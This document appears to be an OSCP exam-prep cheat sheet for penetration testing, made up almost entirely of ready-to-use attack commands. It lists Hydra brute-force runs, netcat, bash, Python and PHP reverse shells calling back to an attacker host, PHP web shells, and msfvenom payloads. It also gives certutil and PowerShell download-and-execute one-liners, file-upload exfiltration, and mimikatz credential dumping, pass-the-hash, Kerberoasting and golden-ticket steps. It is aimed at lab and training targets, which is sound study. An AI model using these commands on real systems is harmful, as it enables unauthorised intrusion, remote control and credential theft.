## 1. Discovery

### 1.1. Port scan

|Scan|Command|
|---|---|
|Initial network sweep|`nmap -sn $TARGET_RANGE`|
|TCP |`nmap -Pn -sT -A $TARGET_IP`|
|UDP |`nmap -sU -A $TARGET_IP`|

## 2. Enumeration

### 2.1. FTP `21`

```console
lftp anonymous:anonymous@$TARGET -e 'find;quit'
lftp $USERNAME:$PASSWORD@$TARGET -e 'find;quit'
```

### 2.2. HTTP/HTTPS `80`/`443`/`8080`

|   |   |
|---|---|
|Nikto|`nikto -host http://$TARGET:$PORT`|
|dirb|`dirb http://$TARGET:$PORT /usr/share/wordlists/dirb/big.txt`|
|gobuster|`gobuster dir -u http://$TARGET:$PORT -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt`|

#### Wordlists:

dirb:

1. `/usr/share/dirb/wordlists/common.txt` (Default)
2. `/usr/share/wordlists/dirb/big.txt`
3. `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

SecLists (`/usr/share/seclists/Discovery/Web-Content/`):

1. `/usr/share/seclists/Discovery/Web-Content/combined_words.txt`
2. `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`

### 2.3. SMB `139`/`445`

|   |   |
|---|---|
|Checking for vulnerabilties|`nmap -Pn -p445 --script smb-vuln-* $TARGET`|
|Checking for SambaCry|`nmap -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $TARGET`|
|Enumerate using empty username/password|`enum4linux $TARGET`|
|Enumerate with specified username/password|`enum4linux -u $USERNAME -p $PASSWORD $TARGET`|
|List shares using NULL|`smbclient -N -L //$TARGET`|
|List shares using username/password|`smbclient -U '$USERNAME%$PASSWORD' -L //$TARGET`|
|List shares using username/hash|`smbclient -U $USERNAME --pw-nt-hash -L //$TARGET`|
|Connect to share using NULL|`smbclient -N //$TARGET/$SHARE`|
|Connect to share using username/password|`smbclient -U '$USERNAME%$PASSWORD' //$TARGET`|
|Connect to share using username/hash|`smbclient -U $USERNAME --pw-nt-hash //$TARGET`|

### 2.4. LDAP `389`

```console
ldapsearch -b 'DC=lab,DC=vx' -H ldap://192.168.17.11 -D 'CN=Bind Account,CN=Users,DC=lab,DC=vx' -W
```

### 2.5. Brute force (Hydra)

#### RDP/SSH/FTP/SMB/MySQL

|   |   |
|---|---|
|Specify username|`hydra -l $USERNAME -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|
|Use username list|`hydra -L $USERNAME_LIST -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|

#### Web

Syntax:

`hydra` `-l $USERNAME`/`-L $USERNAME_LIST` `-P $PASSWORD_LIST` `$TARGET` `http-get-form`/`http-post-form` '`$PATH`:`$REQUEST_BODY`:`F=$FAILURE_VERBIAGE`/`S=$SUCCESS_VERBIAGE`:`H=Cookie:$NAME1=$VALUE1;$NAME2=$VALUE2`'

Examples:

```console
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
```

#### Wordlists:

1. `/usr/share/wordlists/rockyou`
2. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt`
3. `/usr/share/seclists/Usernames/Names/names.txt`

## 3. Shells

### 3.1. Listener

```console
rlwrap nc -nlvp 4444
```

### 3.2. Various reverse shells

#### Netcat Traditional

```console
nc -e /bin/sh $KALI 4444
```

#### Netcat OpenBSD

```console
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Netcat BusyBox

```console
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Bash

```console
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

#### Python

[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

|   |   |
|---|---|
|With `exec`|`php -r '$s=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
|With `shell_exec`|`php -r '$s=fsockopen("$KALI",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`|
|With backticks|``php -r '$s=fsockopen("$KALI",4444);`/bin/sh -i <&3 >&3 2>&3`;'``|
|With `system`|`php -r '$s=fsockopen("$KALI",4444);system("/bin/sh -i <&3 >&3 2>&3");'`|
|With `passthru`|`php -r '$s=fsockopen("$KALI",4444);passthru("/bin/sh -i <&3 >&3 2>&3", "r");'`|
|With `popen`|`php -r '$s=fsockopen("$KALI",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`|
|With `proc_open`|`php -r '$sock=fsockopen($KALI",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`|

To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK ?>`

#### PHP web shells

|   |   |
|---|---|
|`<?php echo passthru($_GET['k']);?>`|[Used in: ITSL:Dealer 313](/practice/itsl/2021-10-24-Dealer313.md)|
|`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL: VulnDC2](/practice/itsl/2022-01-17-Vulndc2.md)|
|`<?php echo passthru($_GET['cmd']); ?>`|[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)|

### 3.3. Payloads

#### MSFVenom reverse shell TCP:

☝️ omit the `x64` to generate a x86 payload

|   |   |
|---|---|
|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f py -o /var/www/html/reverse.py`|
|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
|Windows|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`

#### PowerShell-based reverse shell script:

Download the reverse shell script:

```console
curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
```

Edit the address and port:

```console
sed -i 's/<ADDRESS>/$KALI/' reverse.ps1
sed -i 's/<PORT>/4444/' reverse.ps1
```

### 3.4. Execute payloads

#### Windows: Execute reverse shell TCP payload

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|

#### Windows: Execute PowerShell-based reverse shell script

☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only

(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
```

#### Linux: Execute reverse shell TCP payload

|   |   |
|---|---|
|cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
|Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|

### 3.5. Windows direct connection

#### evil-winrm

- WinRM `5985` must be enabled on the target
- User must be a member of `Remote Management Users` on the target

|   |   |
|---|---|
|Username/password|`evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD`|
|Password hashes|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|

#### impacket-psexec

- The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
- LM hashes are not used from Windows 10 onwards, use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of NULL) to fill the LM hash portion for impacket-psexec or pth-winexe

|   |   |
|---|---|
|Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
|Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|

### 3.6. Upgrade to Full TTY

[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)

```console
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. File transfers

### 4.1. HTTP

#### Download

Web root: `/var/www/html`

Windows:

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe`|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe')`|

Linux:

|   |   |
|---|---|
|cURL|`curl -O http://$KALI/reverse.elf`|
|Wget|`wget http://$KALI/reverse.elf`|


#### Upload

<details>
  <summary>Apache2 setup:</summary>

Prepare uploads directory:

```console
mkdir /var/www/html/uploads
chown www-data:www-data /var/www/html/uploads
```

☝️ apache2 runs as `www-data` user, it needs write permission on the uploads directory for uploads to succeed

Prepare upload page:

```console
curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/main/upload.php
```

☝️ The name for the upload parameter is named as default of `file` to accommodate the PowerShell `UploadFile` method of `System.Net.WebClient` which will `POST` the file to this name

</details>

|   |   |
|---|---|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://$KALI/upload.php','$FILENAME')`|
|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"$FILENAME" -v http://$KALI/upload.php`|

### 4.2. SMB

<details>
  <summary>Samba setup:</summary>

Ref: [Create a passwordless guest share in Samba](https://www.techrepublic.com/article/how-to-create-a-passwordless-guest-share-in-samba/)

```console
sed -i '/;   interfaces/a interfaces = eth0' /etc/samba/smb.conf
sed -i '/;   bind interfaces only = yes/a bind interfaces only = yes' /etc/samba/smb.conf
mkdir /home/share
chmod -R ugo+w /home/share
cat << EOF >> /etc/samba/smb.conf
[public]
path = /home/share
public = yes
guest ok = yes
writable = yes
force create mode = 0666
force directory mode = 0777
browseable = yes
EOF
```

</details>

|   |   |
|---|---|
|Download|`copy \\$KALI\public\$FILENAME .\`|
|Upload|`copy "$FILENAME" \\$KALI\public\`|

### 4.3. FTP

<details>
  <summary>FTP anonymous setup:</summary>

`anon_root` default directory: `/srv/ftp`

```console
sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf
sed -i 's/#anon_upload_enable=YES/anon_upload_enable=YES/' /etc/vsftpd.conf
```

</details>

```cmd
ftp -A $KALI
ftp> get $FILENAME
```

## 5. [Port forwarding](/port-forwarding.md)

### 5.1. SSH port forwarding

|   |   |
|---|---|
|Local (static)|`ssh -L 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET $USERNAME@$TARGET`|
|Local (dynamic)|`ssh -L 0.0.0.0:$PORT_ON_KALI $USERNAME@$TARGET`|
|Remote (static)|`ssh -R 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET root@$KALI`|
|Remote (dynamic)|`ssh -R 0.0.0.0:$PORT_ON_KALI root@$KALI`|

### 5.2. [Chisel](https://github.com/jpillora/chisel)

<details>
  <summary>Preparing chisel binaries:</summary>

Prepare server on Kali:

```console
curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_1.7.7_linux_amd64 chisel
chmod +x chisel
```

Prepare client binaries for Windows target to download

```console
curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
gzip -d chisel_1.7.7_windows_amd64.gz
mv chisel_1.7.7_windows_amd64 /var/www/html/chisel.exe
```

Download client binaries on Windows target

```console
certutil.exe -urlcache -f -split http://$KALI/chisel.exe %TEMP%\chisel.exe
```

</details>

|   |   |
|---|---|
|Server setup|`chisel server --reverse --port 8080`|
|Reverse static|`chisel client $KALI R:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET`|
|Reverse dynamic|`chisel client $KALI R:socks`|

## 5.3. Proxy Chains

<details>
  <summary>Config: <code>/etc/proxychains4.conf</code></summary>

```console
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5  $KALI 1080
```

</details>

```console
proxychains nmap -p- -A $TARGET_INTERNAL_NETWORK
```

## 6. Linux privilege escalation

https://github.com/carlospolop/PEASS-ng/releases

## 7. Windows privilege escalation

https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

https://github.com/carlospolop/PEASS-ng/releases

## 8. Active Directory

### 8.1. [AS-REP roasting](/attacking-active-directory.md#1-as-rep-roasting)

|   |   |
|---|---|
|Install [kerbrute](https://github.com/TarlogicSecurity/kerbrute)|`pip3 install kerbrute`|
|Find users with preauthentication disabled|`kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $DOMAIN -dc-ip $DC_IP`|
|Use GetNPUsers.py to get password hashes|`impacket-GetNPUsers $DOMAIN/$USERNAME -no-pass -dc-ip $DC_IP`|
|Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
|Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|

### 8.2. [Password dumping](/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)

Preparing:

|   |   |
|---|---|
|`mimikatz`|`cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html`|
|`Invoke-Mimikatz`|`curl -o /var/www/html/Invoke-Mimikatz.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1`|

Executing:

```console
mimikatz.exe "privilege::debug token::elevate lsadump::sam exit"
mimikatz.exe "privilege::debug token::elevate lsadump::secrets exit"
mimikatz.exe "privilege::debug token::elevate lsadump::cache exit"
mimikatz.exe "privilege::debug token::elevate sekurlsa::logonpasswords exit"
mimikatz.exe "privilege::debug token::elevate vault::cred /patch exit"
mimikatz.exe "privilege::debug token::elevate lsadump::dcsync /user:domain\krbtgt /domain:$DOMAIN exit"
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://$KALI/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```

### 8.3. [Pass the hash](/attacking-active-directory.md#3-pass-the-hash)

|   |   |
|---|---|
|evil-winrm|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|
|impacket-psexec|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
|pth-winexe|`pth-winexe -U [$DOMAIN/]$USERNAME%$LM_HASH:$NT_HASH //TARGET cmd.exe`|
|sekurlsa::pth + PsExec|`sekurlsa::pth /user:domainadmin /domain:$DOMAINx /ntlm:$NT_HASH`<br>`PsExec \\$TARGET cmd.exe`|

### 8.4. [Kerberoasting](/attacking-active-directory.md#42-kerberoasting)

Option 1: `Invoke-Kerberoast.ps1`

|   |   |
|---|---|
|Prepare file on Kali|`cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html`|
|Execute on target|`powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"`|

Option 2: `impacket-GetUserSPNs`

```console
impacket-GetUserSPNs $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -outputfile tgs.hash
```

Cracking service account hash using hashcat

```console
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

### 8.5. Getting tickets

#### 8.5.1. [Silver ticket](/attacking-active-directory.md#43-silver-ticket)

```cmd
whoami /user
mimikatz # kerberos::hash /password:$SERVICE_ACCOUNT_PASSWORD
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
```

#### 8.5.2. [Golden ticket](/attacking-active-directory.md#5-golden-ticket)

Option 1: `impacket`

```console
impacket-secretsdump -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
impacket-lookupsid -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
impacket-ticketer -nthash $KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator
impacket-psexec $DOMAIN/administrator@$TARGET -k -no-pass -target-ip $TARGET_IP -dc-ip $DC_IP
```

Option 2: `mimikatz`

```cmd
whoami /user
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:KRBTGT_NT_HASH /ptt
mimikatz # misc::cmd
PsExec.exe \\$TARGET cmd.exe
```

## 9. Exam proofs

|OS|Finding|Printing|
|---|---|---|
|Linux|`dir /S *proof.txt`|`hostname`<br>`cat /path/to/flag/proof.txt`<br>`ifconfig`|
|Windows|`find / -name proof.txt`|`hostname`<br>`type C:\path\to\flag\proof.txt`<br>`ipconfig`|

## 10. References
